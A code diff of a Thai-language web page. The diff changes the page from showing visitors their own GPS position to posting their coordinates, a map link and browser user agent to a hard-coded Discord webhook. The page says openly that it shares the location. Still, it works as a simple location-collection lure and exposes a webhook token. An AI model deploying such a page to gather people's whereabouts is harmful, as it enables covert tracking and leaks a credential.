@@ -2,46 +2,56 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>ระบุตำแหน่งผู้ใช้</title>
+  <title>GPS to Discord</title>
 </head>
 <body>
-  <h2>ระบุตำแหน่งของคุณ</h2>
-  <button onclick="getLocation()">📍 แสดงตำแหน่งของฉัน</button>
-  <p id="location">ตำแหน่งจะปรากฏตรงนี้</p>
+  <h2>📍 ส่งตำแหน่งของคุณไปยัง Discord</h2>
+  <button onclick="getLocation()">📤 แชร์ตำแหน่งของฉัน</button>
+  <p id="status">ยังไม่มีการส่งข้อมูล</p>
 
   <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr";
+
     function getLocation() {
+      document.getElementById("status").innerText = "⏳ กำลังขอตำแหน่ง...";
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
+        navigator.geolocation.getCurrentPosition(sendToDiscord, showError);
       } else {
-        document.getElementById("location").innerText = "เบราว์เซอร์ไม่รองรับการระบุตำแหน่ง";
+        document.getElementById("status").innerText = "❌ เบราว์เซอร์ไม่รองรับ GPS";
       }
     }
 
-    function showPosition(position) {
+    function sendToDiscord(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
-      const url = `https://www.google.com/maps?q=${lat},${lon}`;
-      document.getElementById("location").innerHTML =
-        `📍 ละติจูด: ${lat}<br>📍 ลองจิจูด: ${lon}<br>` +
-        `<a href="${url}" target="_blank">🌍 เปิดบน Google Maps</a>`;
+      const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+      const userAgent = navigator.userAgent;
+
+      const data = {
+        content: `📍 มีผู้ใช้ส่งตำแหน่ง:\n\n🌐 [ดูบนแผนที่](${mapUrl})\n📌 พิกัด: ${lat}, ${lon}\n💻 อุปกรณ์: ${userAgent}`
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        if (response.ok) {
+          document.getElementById("status").innerText = "✅ ส่งตำแหน่งไปยัง Discord เรียบร้อยแล้ว!";
+        } else {
+          document.getElementById("status").innerText = "❌ ส่งข้อมูลไม่สำเร็จ";
+        }
+      })
+      .catch(error => {
+        document.getElementById("status").innerText = "❌ เกิดข้อผิดพลาด: " + error;
+      });
     }
 
     function showError(error) {
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          document.getElementById("location").innerText = "❌ คุณไม่อนุญาตให้เข้าถึงตำแหน่ง";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          document.getElementById("location").innerText = "❌ ไม่พบข้อมูลตำแหน่ง";
-          break;
-        case error.TIMEOUT:
-          document.getElementById("location").innerText = "⏳ หมดเวลาการขอตำแหน่ง";
-          break;
-        default:
-          document.getElementById("location").innerText = "❗ เกิดข้อผิดพลาดไม่ทราบสาเหตุ";
-          break;
-      }
+      document.getElementById("status").innerText = "❌ ไม่สามารถระบุตำแหน่งได้ (" + error.message + ")";
     }
   </script>
 </body>
